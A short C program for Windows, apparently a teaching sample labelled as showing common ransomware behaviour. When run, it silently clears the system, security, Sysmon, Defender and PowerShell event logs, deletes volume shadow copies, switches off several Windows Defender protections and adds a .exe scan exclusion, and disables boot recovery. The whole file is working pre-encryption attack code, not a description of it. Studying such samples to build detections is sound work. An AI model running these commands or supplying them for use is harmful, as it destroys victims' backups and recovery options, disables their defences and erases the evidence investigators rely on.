/*
 * ╓──────────────────────────────────────────────────────────────────────────────────────╖
 * ╟──────────────────────────────────────────────────────────────────────────────────────╢
 * ║                                                                                      ║
 * ║   Description: Common ransomware behavior of different commands being executed       ║
   ║                                                                                      ║
 * ║                                                                                      ║
   ║   Happy learning!                                                                    ║
 * ║                                                                                      ║
 * ║                                                                                      ║
 * ║																				                                              ║
 * ║                                                                                      ║
 * ╙──────────────────────────────────────────────────────────────────────────────────────╜
 */

#include <windows.h>
#include <tlhelp32.h>
#include <restartManager.h>
#include <wbemprov.h>
#include <iphlpapi.h>
#include <icmpapi.h>
#include <lm.h>


VOID ClearLogs()
{
    ShellExecuteW(0, L"open", L"wevtutil.exe", L"cl system", 0, SW_HIDE);
    ShellExecuteW(0, L"open", L"wevtutil.exe", L"cl security", 0, SW_HIDE);
    ShellExecuteW(0, L"open", L"wevtutil.exe", L"cl application", 0, SW_HIDE);
    ShellExecuteW(0, L"open", L"wevtutil.exe", L"cl 'Windows PowerShell'", 0, SW_HIDE);
    ShellExecuteW(0, L"open", L"wevtutil.exe", L"cl Microsoft-Windows-Sysmon/Operational", 0, SW_HIDE);
    ShellExecuteW(0, L"open", L"wevtutil.exe", L"cl 'Microsoft-Windows-Windows Defender/Operational'", 0, SW_HIDE);
    ShellExecuteW(0, L"open", L"wevtutil.exe", L"cl Microsoft-Windows-TerminalServices-LocalSessionManager/Operational", 0, SW_HIDE);
    ShellExecuteW(0, L"open", L"wevtutil.exe", L"cl Microsoft-Windows-PowerShell/Operational", 0, SW_HIDE);
}
  
VOID DeleteShadowCopies()
{
    ShellExecuteW(0, L"open", L"vssadmin.exe", L"delete shadows /all /quiet", 0, SW_HIDE);
    ShellExecuteW(0, L"open", L"wmic.exe", L"SHADOWCOPY /nointeractive", 0, SW_HIDE);
    ShellExecuteW(0, L"open", L"wmic.exe", L"shadowcopy delete", 0, SW_HIDE);
}

VOID DefenderTampering()
{
    ShellExecuteW(0, L"open", L"powershell.exe", L"Set-MpPreference -DisableIOAVProtection $true", 0, SW_HIDE);
    ShellExecuteW(0, L"open", L"powershell.exe", L"Set-MpPreference -DisableRealtimeMonitoring $true", 0, SW_HIDE);
    ShellExecuteW(0, L"open", L"powershell.exe", L"Set-MpPreference -DisableBehaviorMonitoring $true", 0, SW_HIDE);
    ShellExecuteW(0, L"open", L"powershell.exe", L"Set-MpPreference -DisableIntrusionPreventionSystem $true", 0, SW_HIDE);
    ShellExecuteW(0, L"open", L"powershell.exe", L"Set-MpPreference -DisableScriptScanning $true", 0, SW_HIDE);
    ShellExecuteW(0, L"open", L"powershell.exe", L"Add-MpPreference -ExclusionExtension .exe", 0, SW_HIDE);
}

VOID DisableOSRecovery()
{
    ShellExecuteW(0, L"open", L"bcdedit.exe", L"/set {default} bootstatuspolicy ignoreallfailures", 0, SW_HIDE);
    ShellExecuteW(0, L"open", L"bcdedit.exe", L"/set {default} recoveryenabled no", 0, SW_HIDE);
}

int main()
{
    ClearLogs();
    DeleteShadowCopies();
    DefenderTampering();
    DisableOSRecovery();
}
